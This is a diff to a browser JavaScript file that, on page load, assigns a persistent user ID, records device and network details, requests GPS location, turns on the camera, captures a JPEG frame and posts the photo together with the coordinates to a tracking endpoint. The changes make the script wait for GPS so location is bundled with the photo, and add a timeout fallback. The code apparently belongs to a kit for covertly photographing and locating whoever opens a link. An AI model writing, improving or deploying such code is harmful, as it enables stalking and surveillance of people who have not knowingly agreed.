@@ -1,7 +1,7 @@
 const API = "/api/track";
 
 // ==============================
-// USER + SESSION
+// SESSION + USER
 // ==============================
 function getUserId() {
   let id = localStorage.getItem("user_id");
@@ -47,19 +47,19 @@ function send(data) {
 }
 
 // ==============================
-// INIT DATA (FIXED FIELD NAMES)
+// INIT DATA
 // ==============================
 send({
   event: "init",
   device: navigator.userAgent,
   os: navigator.platform,
-  browser: navigator.userAgent, // better than appName
+  browser: navigator.userAgent,
   network: navigator.connection?.effectiveType || "unknown",
   time: new Date().toISOString()
 });
 
 // ==============================
-// NETWORK INFO (FIXED FIELD)
+// NETWORK UPDATE
 // ==============================
 const net = navigator.connection || {};
 send({
@@ -69,23 +69,32 @@ send({
 });
 
 // ==============================
-// GPS LOCATION
+// GPS HANDLING (IMPORTANT FIX)
 // ==============================
+let gpsDone = false;
+let gpsData = {};
+
 navigator.geolocation.getCurrentPosition(
   pos => {
-    send({
-      event: "gps",
+    gpsDone = true;
+    gpsData = {
       lat: pos.coords.latitude,
       lng: pos.coords.longitude
+    };
+
+    send({
+      event: "gps",
+      ...gpsData
     });
   },
   () => {
+    gpsDone = true;
     send({ event: "gps_denied" });
   }
 );
 
 // ==============================
-// FINAL EVENT CONTROL (IMPORTANT)
+// FINAL CONTROL (NO DUPLICATE)
 // ==============================
 let finalSent = false;
 
@@ -101,9 +110,8 @@ function sendFinal(data) {
 }
 
 // ==============================
-// CAMERA CAPTURE (OPTIMIZED)
+// CAMERA CAPTURE (FIXED FLOW)
 // ==============================
-
 async function camera() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
@@ -118,23 +126,24 @@ async function camera() {
     video.srcObject = stream;
     await video.play();
 
-    const canvas = document.createElement("canvas");
+    // ⏳ WAIT FOR GPS (MAX 2s)
+    const start = Date.now();
+    while (!gpsDone && Date.now() - start < 2000) {
+      await new Promise(r => setTimeout(r, 100));
+    }
 
-    // ✅ MATCH VIDEO SIZE (NO DISTORTION)
+    const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
 
     const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0);
 
-    // ✅ DRAW CLEAN FRAME
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    const image = canvas.toDataURL("image/jpeg", 0.85);
 
-    // ✅ HIGH QUALITY (BUT SAFE SIZE)
-    const image = canvas.toDataURL("image/jpeg", 0.9);
-
-    send({
-      event: "final",
+    sendFinal({
       image,
+      ...gpsData,
       device: navigator.userAgent,
       os: navigator.platform,
       browser: navigator.userAgent,
@@ -144,9 +153,15 @@ async function camera() {
     stream.getTracks().forEach(t => t.stop());
 
   } catch (e) {
-    send({
-      event: "final",
-      camera: "denied"
+    // ⏳ WAIT FOR GPS BEFORE FINAL
+    const start = Date.now();
+    while (!gpsDone && Date.now() - start < 2000) {
+      await new Promise(r => setTimeout(r, 100));
+    }
+
+    sendFinal({
+      camera: "denied",
+      ...gpsData
     });
   }
 }
@@ -157,10 +172,11 @@ async function camera() {
 camera();
 
 // ==============================
-// FALLBACK (ONLY IF CAMERA FAILS)
+// FALLBACK (SAFE)
 // ==============================
 setTimeout(() => {
   sendFinal({
-    camera: "timeout"
+    camera: "timeout",
+    ...gpsData
   });
 }, 8000);
